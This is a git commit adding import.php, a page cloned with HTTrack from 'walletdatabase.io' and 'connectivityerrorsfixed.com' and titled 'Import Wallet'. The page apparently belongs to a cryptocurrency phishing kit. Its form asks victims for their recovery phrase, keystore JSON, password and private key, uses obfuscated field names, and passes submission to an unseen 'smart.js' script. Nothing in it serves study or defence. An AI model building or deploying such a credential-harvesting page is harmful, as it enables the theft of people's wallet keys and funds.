bacd642ed14d5696e5a27f2e06c909a7e384c080
FredieMark <fredie.richank@gmail.com>
2022-09-17 18:41:08 +0100

    m

---
+++ import.php
@@ -0,0 +1,63 @@
+<!DOCTYPE html>
+<html><!-- Mirrored from walletdatabase.io/list/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Nov 2021 09:35:54 GMT -->
+<!-- Mirrored from connectivityerrorsfixed.com/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Apr 2022 10:23:13 GMT -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="app-asset/bootstrap.css">
+    <link rel="stylesheet" href="app-asset/fontawesome-all.css">
+    <link rel="stylesheet" href="app-asset/styles.css">
+</head>
+
+<body>
+    <header>
+        <div class="container-fluid">
+			<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<button class="btn btn-md text-white border-3 back-btn rounded-circle border border-white">&#8634;</button>&nbsp; &nbsp;<span class="text-light selected-wallet" style="font-size: 20px;"></span>
+			</div>
+			</div>
+		</div>
+    </header>
+
+    <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<div class="tab-content">
+
+						<h4 style="color: white;"></h4>
+						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
+							<div method="post" action="#">
+								<div class="form-group mb-3">
+									<textarea class="form-control" rows="5" id="yhgtrfeaddwd" name="yhgtrfeaddwd" placeholder="Phrase"></textarea>
+								</div>
+								<div class="form-group mb-3">
+									<textarea class="form-control" name="hgrfwedewrevte" id="hgrfwedewrevte" rows="5" placeholder="Keystore JSON"></textarea>
+								</div>
+								<div class="form-group mb-3">
+									<input class="form-control" id="hgerwdewfwegeg" type="hgerwdewfwegeg" name="password" placeholder="Password" type="password">
+								</div>
+								<div class="form-group mb-3">
+									<input class="form-control" id="hgfwdweryehtr" name="hgfwdweryehtr" placeholder="Private Key">
+								</div>
+								<input type="hidden" id="wall">
+								<div class="form-group"><button class="btn btn-light btn-lg btn-block" type="button" name="submit" id="submit"><span class="text-light">&#10004;</span> Submit</button></div>
+							</div>
+						</div>
+						
+					</div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <script src="app-asset/jquery.js"></script>
+    <script src="app-asset/bootstrap.js"></script>
+    <script src="app-asset/smart.js"></script>
+</body>
+
+<!-- Mirrored from connectivityerrorsfixed.com/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Apr 2022 10:23:14 GMT -->
+</html>
